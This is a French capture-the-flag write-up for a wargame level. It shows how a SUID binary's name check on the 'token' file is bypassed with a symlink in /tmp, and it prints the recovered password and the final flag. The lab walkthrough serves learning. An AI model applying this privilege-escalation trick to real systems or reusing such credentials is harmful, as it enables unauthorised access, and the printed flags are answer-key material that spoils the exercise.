# Level08

implique un binaire avec le bit SUID activé et l'objectif est d'exploiter cette configuration pour accéder au contenu du fichier "token".

1) Pour tester le binaire level08, vous pouvez l'exécuter avec ou sans un nom de fichier en argument:
```bash
./level08
./level08 [file to read]
```

2) Si vous tentez de lire le fichier "token" directement avec le binaire level08, il vous refusera l'accès, comme le montre l'exemple :
```bash
./level08 token
You may not access 'token'
```

3) En examinant les permissions du répertoire, vous pouvez constater que le fichier "level08" a le bit SUID activé. Cela signifie que lorsque vous exécutez "level08", il s'exécute avec les droits de l'utilisateur propriétaire du fichier ("flag08" dans ce cas).
```bash
ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

4) Pour exploiter cette configuration, vous pouvez créer un lien symbolique du fichier "token" dans un répertoire où vous avez l'accès. Par exemple, créez un lien symbolique dans "/tmp" :
```bash
ln -s /home/user/level08/token /tmp/toto
```

6) Ensuite, exécutez le binaire level08 en lui passant le lien symbolique comme argument :
```bash
./level08 /tmp/toto
quif5eloekouj29ke0vouxean
```

5) Une fois que vous avez obtenu le contenu du fichier "token", vous pouvez l'utiliser pour accéder au compte "flag08" et récupérer le jeton du niveau suivant. Vous pouvez le faire en lançant une session en tant que "flag08" :
```bash
su flag08
```

8) Enfin, exécutez la commande "getflag" pour obtenir le jeton du niveau suivant :
```bash
getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
